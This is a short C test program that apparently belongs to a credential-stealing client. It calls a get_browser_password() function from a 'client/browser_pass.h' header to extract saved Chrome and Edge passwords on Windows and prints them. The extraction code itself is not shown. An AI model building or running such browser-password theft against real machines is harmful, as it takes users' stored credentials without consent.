#include <stdio.h>
#include <stdlib.h>
#include "client/browser_pass.h"

int main(int argc, char* argv[]) {
    printf("[*] Testing Chrome/Edge password extraction...\n");
    printf("[*] This must be run on Windows as the current user\n\n");
    
    char* passwords = get_browser_password();
    
    if (passwords == NULL) {
        printf("[-] Failed to retrieve passwords\n");
        printf("[-] Possible reasons:\n");
        printf("    - Chrome/Edge not installed\n");
        printf("    - No saved passwords\n");
        printf("    - Database locked (close browser)\n");
        printf("    - Permission issues\n");
        return 1;
    }
    
    if (passwords[0] == '\0') {
        printf("[*] No passwords found in database\n");
    } else {
        printf("[+] Retrieved passwords:\n");
        printf("=====================================\n");
        printf("%s", passwords);
        printf("=====================================\n");
    }
    
    free(passwords);
    
    printf("\n[*] Done\n");
    return 0;
}